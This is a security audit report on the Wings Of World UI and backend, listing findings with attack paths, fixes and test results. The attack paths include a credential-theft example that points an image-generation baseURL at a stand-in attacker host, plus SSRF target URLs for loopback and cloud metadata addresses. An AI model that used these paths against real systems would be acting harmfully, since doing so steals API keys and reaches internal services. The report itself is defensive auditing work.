# Wings Of World Security and Code Quality Audit

Date: 2026-05-18
Scope: `Wings_UI`, `Wings_Backend`, root release scripts and deployment docs.
Method: Codex Security style pass: threat model, finding discovery, validation, attack-path analysis, and fix plan.

## Executive Summary

No P0 issue was confirmed in this pass.

Status update on 2026-05-20: the confirmed `Wings_UI` P1/P2 security findings from this report are now fixed and covered by regression tests. Local operator use on `127.0.0.1:5173` is verified against the production build. The remaining blockers are operational/configuration issues and the incomplete `Wings_Backend` checkout, not the fixed `Wings_UI` security paths.

Current high-signal status:

- `SEC-001` fixed in `Wings_UI`: remote API and `/metrics` access now fail closed when app auth is disabled, while loopback local use remains allowed.
- `SEC-002` fixed in `Wings_UI`: image generation rejects request-level provider `baseURL`, and provider-returned image URL download uses the shared SSRF/content-type/size guard.
- `SEC-003` fixed in `Wings_UI`: all `web_fetch` execution paths now use the guarded `fetchWebContent` implementation.
- `SEC-004` fixed in `Wings_UI`: high-risk tools require confirmation and are excluded from autonomous agentic tool definitions.
- `SEC-005` partially fixed: `Wings_UI` production dependency audit is clean; `Wings_Backend` remains blocked until the checkout/build artifacts are restored.
- `Wings_UI` still needs real operator setup before full use: enable app auth, configure the provider API key or a supported local provider, and stop the competing Telegram poller that is using the same bot token.

## Threat Model

### Assets

- Provider API keys and custom base URLs in `Wings_UI/data/config.json` or environment variables.
- Local app auth password/session state in `WINGS_OF_WORLD_DATA_DIR`.
- Chat sessions, execution artifacts, workflow runs, memory, generated images, webhooks, Telegram state, SQLite DB.
- Allowed workspace files reachable through tool execution.
- Backend gateway auth tokens/passwords and plugin credentials.
- Release package zip and handoff artifacts.

### Entry Points

- Browser UI and Express API in `Wings_UI/server/index.ts`.
- Tool execution via `/api/tools/execute`, workflow execution, agentic tool-calling, scheduled tasks, macros.
- Image generation via `/api/images/generate`.
- Webhooks via `/api/webhooks/ingest/:id`.
- Telegram polling and outbound sending.
- Backend bridge via `/api/backend/status` and `/api/backend/start`.
- `Wings_Backend` gateway, extensions, plugin SDK, channel integrations, and media/browser/runtime tools.
- Release packaging via `package-release.ps1` and `Wings_UI/scripts/verify-release.mjs`.

### Trust Boundaries

- Local browser/operator vs remote network clients.
- App auth session/API token vs unauthenticated requests.
- User/tool input vs local filesystem.
- User/tool supplied URLs vs internal network/metadata endpoints.
- Provider API key storage vs request-controlled provider endpoints.
- UI process vs backend gateway process.
- Source tree vs runtime data/release artifacts.

## Findings

### SEC-001 - P1 - Remote deployment can expose read APIs and metrics when app auth is disabled

Evidence:

- `Wings_UI/Dockerfile:32` and `Wings_UI/docker-compose.yml:12` set `HOST=0.0.0.0`.
- `Wings_UI/server/index.ts:8278-8301` only requires app auth when `isAppAuthEnabled()` is true. If no local app password has been bootstrapped, read APIs are generally open.
- `Wings_UI/server/index.ts:8331-8338` exposes `/metrics` outside the `/api/*` auth middleware path.
- Sensitive read APIs include chat session metadata/content at `Wings_UI/server/index.ts:10146-10288`, execution artifacts at `Wings_UI/server/index.ts:10158-10194`, and memory context at `Wings_UI/server/index.ts:11110-11112`.

Attack path:

1. Operator runs the Docker image or compose file with `HOST=0.0.0.0`.
2. Reverse proxy/firewall is missing or misconfigured, and app auth has not been bootstrapped.
3. A remote client reads `/api/chat/sessions`, `/api/chat/sessions/:id`, `/api/executions/:id/artifact`, `/api/memory/context`, or `/metrics`.
4. The client can infer prompts, usage, workflow/tool outputs, memory contents, models, costs, and operational state.

Impact:

- Disclosure of local AI workspace data, prompts, memory, run artifacts, and metrics.
- Public exposure risk is especially high because the deployment files bind to all interfaces by default.

Fix:

- Fail closed when binding to non-loopback unless app auth is enabled or an explicit env override is set, for example `WINGS_OF_WORLD_ALLOW_UNAUTHENTICATED_REMOTE=1`.
- Gate `/metrics` behind app auth/API token, or restrict it to loopback by default.
- Add a readiness warning/error when `HOST` is not loopback and app auth is disabled.
- Add HTTP middleware tests for remote-style requests with auth disabled/enabled.

Verification:

- Add tests that assert remote GET requests to `/api/chat/sessions`, `/api/executions`, `/api/memory/context`, and `/metrics` are rejected unless app auth/token is present.
- Run `pnpm test`, `pnpm verify:smoke`, and `pnpm verify:release`.

### SEC-002 - P1 - Image generation can exfiltrate API keys and fetch unsafe provider-returned URLs

Evidence:

- `Wings_UI/server/index.ts:2696-2700` accepts `args.baseURL` for image generation.
- `Wings_UI/server/index.ts:2708-2728` reuses `cfg.apiKey` or `OPENAI_API_KEY` and sends it as `Authorization: Bearer ...` to the request-controlled image base URL.
- `Wings_UI/server/index.ts:2752-2761` fetches `first.url` returned by the image provider directly, without the private-network guard used by `server/features/web-fetch.ts`.
- `Wings_UI/server/index.ts:2955-2966` advertises `baseURL` as a public `generate_image` tool parameter.
- `Wings_UI/server/index.ts:10584-10589` passes HTTP request body arguments directly into `generateImage`.

Attack path:

1. A user with access to the app sends `POST /api/images/generate` or calls the `generate_image` tool with `baseURL=https://attacker.example/v1`.
2. The server posts to `https://attacker.example/v1/images/generations` with the stored provider API key.
3. The attacker captures the API key from the Authorization header.
4. A malicious provider response can also return a private/internal `data[0].url`; the server fetches it and stores the response as a generated image.

Impact:

- Provider credential theft.
- SSRF-style access from the server to private network or local endpoints.
- Potential storage abuse if large or unexpected image responses are returned.

Fix:

- Remove request-level `baseURL` from `generate_image`; use configured settings only.
- If override is required for admin use, never attach stored API keys to a request-controlled endpoint.
- Add a safe image downloader that rejects loopback/private/link-local hosts, enforces `image/*` content type, and caps downloaded bytes.
- Prefer `b64_json` responses and reject URL downloads unless explicitly enabled.

Verification:

- Unit test that `baseURL` in request body is ignored or rejected.
- Unit test that a mocked malicious provider URL to `http://127.0.0.1/...` is rejected.
- Unit test that oversized or non-image downloads are rejected.

### SEC-003 - P2 - `web_fetch` has a duplicate unsafe execution path that bypasses the SSRF guard

Evidence:

- A safe helper exists in `Wings_UI/server/features/web-fetch.ts:47-65`, rejecting localhost, `127.0.0.1`, `.local`, `169.254.*`, `10.*`, `192.168.*`, and `172.16-31.*`.
- The helper enforces a byte ceiling at `Wings_UI/server/features/web-fetch.ts:40` and `Wings_UI/server/features/web-fetch.ts:142-144`.
- `TOOL_DEFINITIONS` defines `web_fetch` twice: `Wings_UI/server/index.ts:2865-2872` and `Wings_UI/server/index.ts:2922-2930`.
- `executeTool` handles `web_fetch` twice. The first branch at `Wings_UI/server/index.ts:4867-4870` calls raw `runWebFetch`; the safer branch at `Wings_UI/server/index.ts:4976-4980` is unreachable.
- `runWebFetch` at `Wings_UI/server/index.ts:4647-4664` calls `fetch(url)` directly.
- Tests cover `fetchWebContent` but not the public `executeTool("web_fetch")` path: `Wings_UI/server/test/web-fetch.test.ts:29-91`.

Attack path:

1. A user or agentic loop invokes `web_fetch` with `http://127.0.0.1:<port>/...`, `http://169.254.169.254/...`, or another private URL.
2. The first `web_fetch` branch runs before the safe helper branch.
3. The server performs the unsafe fetch and returns stripped response text.

Impact:

- SSRF against local services and private network resources.
- Existing SSRF tests give false confidence because they test the helper, not the active tool route.

Fix:

- Delete `runWebFetch`.
- Delete the first `web_fetch` tool definition and execution branch.
- Keep only the `fetchWebContent` implementation and add a regression test through `/api/tools/execute` and direct tool execution.

Verification:

- Test `web_fetch` through the same code path used by HTTP/workflows/agent loops.
- Confirm `http://127.0.0.1/foo`, `http://localhost/foo`, `http://192.168.1.1/foo`, and `http://169.254.169.254/foo` are rejected.

### SEC-004 - P2 - High-risk tools are exposed without confirmation

Evidence:

- `hermes_execute` and `run_macro` are marked `riskLevel: "high"` at `Wings_UI/server/index.ts:2874-2887`.
- They do not set `requiresConfirmation: true`.
- `getAgenticToolDefinitions()` at `Wings_UI/server/index.ts:3008-3010` exposes all tools that do not require confirmation.
- The HTTP handler only blocks tools when `tool.requiresConfirmation` is true at `Wings_UI/server/index.ts:10485-10496`.
- `hermes_execute` accepts request-level `baseURL` and passes `cfg.apiKey` into a Python child process environment at `Wings_UI/server/index.ts:4881-4908`.

Attack path:

1. A prompt or workflow causes an agentic tool call to choose `run_macro` or `hermes_execute`.
2. No confirmation gate triggers because the high-risk tools do not set `requiresConfirmation`.
3. The tool can run autonomous local task loops or delegate to an external agent process with provider credentials.

Impact:

- Tool authority escalation inside the local app.
- Accidental or prompt-induced side effects, including file reads/writes, command-like actions through macro logic, and API key exposure to delegated processes.

Fix:

- Require confirmation for every `riskLevel: "high"` tool by policy, not per-tool memory.
- Remove request-level `baseURL` from `hermes_execute`, or do not pass stored API keys to request-controlled endpoints.
- Exclude high-risk tools from agentic/autonomous definitions by default.
- Add audit log fields for confirmation source and operator identity.

Verification:

- Test `/api/tools/execute` returns 400 for high-risk tools without `confirm=true`.
- Test `getAgenticToolDefinitions()` excludes all high-risk tools.

### SEC-005 - P1 - Dependency advisories remain unresolved in both projects

Evidence:

- `pnpm audit --prod --audit-level low` in `Wings_UI` completed with 41 vulnerabilities: 2 low, 31 moderate, 8 high.
- `pnpm audit --prod --audit-level low` in `Wings_Backend` completed with 79 vulnerabilities: 3 low, 47 moderate, 27 high, 2 critical.
- UI dependency anchors include `axios` at `Wings_UI/package.json:58`, `express` at `Wings_UI/package.json:64`, and `streamdown` at `Wings_UI/package.json:85`.
- Backend dependency anchors include `@line/bot-sdk` at `Wings_Backend/package.json:870`, `@mariozechner/pi-ai` at `Wings_Backend/package.json:873`, `hono` at `Wings_Backend/package.json:889`, and `@whiskeysockets/baileys` at `Wings_Backend/package.json:975`.

Notable advisories observed:

- UI: `path-to-regexp` high via Express 4, `axios` high advisories, `lodash`/`lodash-es` high advisories, `mermaid`/`DOMPurify` moderate advisories, `qs` low advisory.
- Backend: `protobufjs` critical via `@google/genai` and Baileys/libsignal paths, `path-to-regexp` high via Express 5 router, `basic-ftp` high via proxy-agent path, `axios` high via LINE/Feishu SDKs, `simple-git` high, `hono` moderate/low advisories.

Impact:

- Supply-chain exposure in runtime request parsing, network clients, rendering/sanitization paths, provider SDKs, and backend extensions.
- Backend critical advisories should block production release until upgraded or explicitly mitigated.

Fix:

- Upgrade direct dependencies to patched versions where available.
- Add targeted `pnpm.overrides` only after confirming compatibility with tests.
- For backend extensions that pull vulnerable transitive packages, upgrade the parent package first; if unavailable, disable the extension from production bundles until patched.
- Add `pnpm audit --prod --audit-level moderate` or stricter to release gates once current advisories are resolved.

Verification:

- Re-run `pnpm audit --prod --audit-level low` in both `Wings_UI` and `Wings_Backend`.
- Re-run UI release verification and targeted backend tests after dependency changes.

### SEC-006 - P2 - `Wings_Backend` checkout cannot build, blocking gateway validation

Evidence:

- `pnpm build` in `Wings_Backend` fails because `scripts/bundle-a2ui.mjs` is missing.
- `Wings_Backend/package.json:695` references `node scripts/bundle-a2ui.mjs`.
- Missing artifacts were confirmed with `Test-Path`: `scripts/bundle-a2ui.mjs`, `src/cli/logs-cli.ts`, `src/gateway/protocol/schema/logs-chat.ts`, and `apps/shared/OpenClawKit/Sources/OpenClawKit/Resources/tool-display.json` are absent.
- `Wings_Backend/src/agents/tool-display.ts:1`, `Wings_Backend/src/gateway/protocol/schema.ts:10`, and `Wings_Backend/src/cli/program/register.subclis.ts:81` reference missing files/modules.

Impact:

- Backend gateway cannot be proven buildable or production-ready from this repository snapshot.
- UI/backend connection remains status-only unless a built backend CLI is supplied externally.
- Backend security fixes cannot be fully verified until the checkout is restored.

Fix:

- Restore the full backend source archive, including `scripts/`, `apps/shared/`, protocol schema sources, and CLI submodules.
- Add a backend checkout integrity script that fails early with a clear missing-file list.
- Keep `/api/backend/status` surfacing missing backend artifacts, but do not market the backend as ready until `pnpm build` passes.

Verification:

- `cd Wings_Backend && pnpm build`
- `cd Wings_Backend && pnpm test` or targeted security suites.
- `GET /api/backend/status` should report `canStart: true` only when a valid local/global/env backend CLI is available.

### SEC-007 - P2 - Tool path root check is Windows-specific and leaks full workspace roots

Evidence:

- `Wings_UI/server/index.ts:4591-4596` checks allowed roots with `normalized.startsWith(`${normalizedRoot}\\`)`.
- This separator is Windows-specific and will not work for nested paths on Linux containers.
- `Wings_UI/Dockerfile:32` and `Wings_UI/docker-compose.yml:12` indicate container deployment is a supported path.
- `/api/tools` returns `workspaceRoots` at `Wings_UI/server/index.ts:10475-10476`.
- `/api/system/readiness` indirectly exposes root availability details via `buildSystemReadiness()` at `Wings_UI/server/index.ts:4072-4188`.

Impact:

- File tools can break in Linux/Docker production even when roots are valid.
- Full absolute local paths are exposed to any API reader when app auth is disabled.

Fix:

- Replace separator string checks with `path.relative(root, candidate)` and verify the relative path is neither `..` nor absolute.
- Hide full workspace roots from unauthenticated/non-admin responses; expose count/status only.
- Add cross-platform tests with mocked POSIX-style paths or move root checking into a small testable module.

Verification:

- Unit tests for Windows and POSIX path roots.
- Container smoke test for `read_file`/`list_directory` under allowed roots.

### QUAL-001 - P3 - Main server entrypoint is too large for safe maintenance

Evidence:

- `Wings_UI/server/index.ts` is 10,587 lines.
- The same file owns auth, provider config, agent loops, tool execution, image generation, Telegram, backend bridge, routes, export/import, and metrics.
- Duplicate `web_fetch` definitions/branches show the practical maintenance risk of this file size.

Impact:

- Higher chance of duplicate validation, unreachable code, and inconsistent security controls.
- Slower review and harder targeted test coverage.

Fix:

- Extract route modules by feature: auth, settings/providers, tools, workflows, images, Telegram, backend bridge, system/export.
- Extract shared security helpers: URL guard, path guard, public exposure guard, tool confirmation policy.
- Add tests at module boundaries before moving behavior.

Verification:

- Keep public API paths stable.
- Run `pnpm test`, `pnpm check`, `pnpm build`, and `pnpm verify:release` after each extraction.

## Validated Existing Controls

- App auth uses salted hashes and session binding logic in `Wings_UI/server/index.ts:647-862`.
- API tokens are hashed/scoped and tested in `Wings_UI/server/features/api-tokens.ts` and `Wings_UI/server/test/api-tokens.test.ts`.
- Mutating API routes are loopback-restricted when accessed remotely via `shouldRestrictToLoopback()` at `Wings_UI/server/index.ts:902-912`.
- Webhook ingest uses HMAC verification and rate limiting.
- Release packaging excludes `.env`, `node_modules`, `dist`, `data`, `logs`, DB files, and local secret artifacts through `package-release.ps1` and `Wings_UI/scripts/verify-release.mjs`.
- `Wings_UI/scripts/verify-smoke.mjs` validates secret-file blocking for `.env.local`.

## Verification Log

Commands run from the local `Wings Of World` project root.

| Area | Command | Result |
| --- | --- | --- |
| Git root | `git rev-parse --show-toplevel` | local project checkout root |
| UI typecheck | `cd Wings_UI && pnpm check` | Pass |
| UI unit tests | `cd Wings_UI && pnpm test` | Pass, 31 files / 399 tests |
| UI build | `cd Wings_UI && pnpm build` | Pass |
| UI smoke | `cd Wings_UI && pnpm verify:smoke` | Pass |
| UI release gate | `cd Wings_UI && WINGS_OF_WORLD_SKIP_BROWSER_VERIFY=1 pnpm verify:release` | Pass on rerun; browser verify intentionally skipped |
| UI dependency audit | `cd Wings_UI && pnpm audit --prod --audit-level low` | Fails due advisories: 41 total, 8 high |
| Backend build | `cd Wings_Backend && pnpm build` | Fails: missing `scripts/bundle-a2ui.mjs` |
| Backend dependency audit | `cd Wings_Backend && pnpm audit --prod --audit-level low` | Fails due advisories: 79 total, 2 critical, 27 high |

Additional fix verification run from the local `Wings_UI` checkout on 2026-05-20:

| Area | Command | Result |
| --- | --- | --- |
| UI production audit | `pnpm audit --prod` | Pass, no known vulnerabilities |
| UI typecheck | `pnpm check` | Pass |
| UI unit/security tests | `pnpm test` | Pass, 36 files / 423 tests |
| UI production build | `pnpm build` | Pass |
| UI production smoke | `pnpm verify:smoke` | Pass |
| UI release package gate | `WINGS_OF_WORLD_SKIP_BROWSER_VERIFY=1 pnpm verify:release` | Pass; release zip verified and excludes runtime/secrets artifacts |
| UI browser smoke | `CI=1 pnpm verify:browser` | Pass after installing Playwright Chromium and using an isolated production server |
| Live local health | `GET http://127.0.0.1:5173/api/system/health` | Pass; server running on loopback |
| Live local readiness | `GET http://127.0.0.1:5173/api/system/readiness` | Partial; only setup/runtime warnings remain |
| Release zip artifact | `.\package-release.ps1` plus zip entry inspection | Pass; local release zip contained no forbidden runtime/secrets entries |

Notes:

- The first `verify:release` attempt inside the sandbox failed with `spawn EPERM`; it was rerun with approval.
- One escalated `verify:release` attempt hit a transient `verify:smoke failed: fetch failed`; no process remained on port 3012, and the next rerun passed.
- Browser-level `verify:browser` was skipped with `WINGS_OF_WORLD_SKIP_BROWSER_VERIFY=1` in this audit pass.

## Recommended Fix Order

Completed in `Wings_UI`:

1. `SEC-002` image generation credential/SSRF issue.
2. `SEC-003` duplicate unsafe `web_fetch` path.
3. `SEC-004` high-risk tool confirmation policy.
4. `SEC-001` public exposure fail-closed behavior and `/metrics` auth.
5. `SEC-005` UI dependency advisories.

Remaining work:

1. Restore `Wings_Backend` artifacts and make backend build/test/audit pass.
2. Enable app auth and configure the production provider credentials.
3. Resolve the Telegram polling conflict by stopping the competing bot instance or moving one side to webhook mode.
4. Fix path guard portability and reduce root disclosure.
5. Start modular extraction of `Wings_UI/server/index.ts` after the security fixes remain covered by tests.

## Release Decision

Local operator use on `127.0.0.1:5173` is acceptable after the 2026-05-20 fixes and verification run.

Do not treat this as a complete public/production deployment until app auth is enabled, provider credentials are configured, the Telegram polling conflict is resolved, and `Wings_Backend` is restored to a buildable checkout. The `Wings_UI` public-exposure guard now fails closed, but operator auth should still be enabled before shared use.
